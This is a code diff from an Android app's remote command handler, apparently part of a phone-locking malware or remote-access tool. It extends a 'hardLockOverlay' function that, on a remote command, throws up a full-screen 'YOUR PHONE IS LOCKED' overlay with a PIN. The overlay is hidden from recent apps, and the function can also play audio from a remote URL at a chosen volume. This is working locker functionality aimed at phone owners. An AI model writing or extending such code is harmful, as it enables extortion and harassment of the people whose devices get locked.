@@ -310,34 +310,61 @@ object NativeCommandHandler {
     // ==========================================
     // ===== LOCK (OVERLAY) =====
     // ==========================================
-    private fun hardLockOverlay(context: Context, extra: String): JSONObject {
-        return try {
-            // Parse extra: "message|pin"
-            val parts = extra.split("|")
-            val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
-                ?: "YOUR PHONE IS LOCKED"
-            val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
-                ?: "1234"
+  private fun hardLockOverlay(context: Context, extra: String): JSONObject {
+    return try {
+        // ==========================================
+        // ===== PARSE EXTRA =====
+        // ==========================================
+        // Format 1: "message|pin"
+        // Format 2: "message|pin|audio_url"
+        // Format 3: "message|pin|audio_url|volume"
+        val parts = extra.split("|")
 
-            Log.d(TAG, "🔒 Launch lock overlay: message=$message, pin=${pin.take(2)}***")
+        val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
+            ?: "YOUR PHONE IS LOCKED"
+        val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
+            ?: "1234"
+        val audioUrl = parts.getOrNull(2) ?: ""
+        val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f
 
-            // Launch LockOverlayActivity (bukan dpm.lockNow())
-            LockOverlayActivity.launch(context, message, pin)
+        Log.d(TAG, "🔒 Launch lock overlay:")
+        Log.d(TAG, "   message: $message")
+        Log.d(TAG, "   pin:     ${pin.take(2)}***")
+        Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
+        Log.d(TAG, "   volume:  $volume")
 
-            JSONObject().apply {
-                put("ok", true)
-                put("locked", true)
-                put("message", message)
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "hardLockOverlay error", e)
-            JSONObject().apply {
-                put("ok", false)
-                put("error", e.message ?: "lock_error")
-            }
+        // ==========================================
+        // ===== LAUNCH OVERLAY =====
+        // ==========================================
+        val intent = Intent(context, LockOverlayActivity::class.java).apply {
+            addFlags(
+                Intent.FLAG_ACTIVITY_NEW_TASK or
+                Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                Intent.FLAG_ACTIVITY_NO_HISTORY or
+                Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
+            )
+            putExtra(LockOverlayActivity.EXTRA_MESSAGE, message)
+            putExtra(LockOverlayActivity.EXTRA_PIN, pin)
+            putExtra("lock_audio_url", audioUrl)
+            putExtra("lock_audio_volume", volume)
+        }
+        context.startActivity(intent)
+
+        JSONObject().apply {
+            put("ok", true)
+            put("locked", true)
+            put("message", message)
+            put("has_sound", audioUrl.isNotEmpty())
+            put("audio_url", audioUrl)
+        }
+    } catch (e: Exception) {
+        Log.e(TAG, "hardLockOverlay error", e)
+        JSONObject().apply {
+            put("ok", false)
+            put("error", e.message ?: "lock_error")
         }
     }
-
+}
     private fun unlockOverlay(): JSONObject {
         return try {
             Log.d(TAG, "🔓 Unlock overlay")
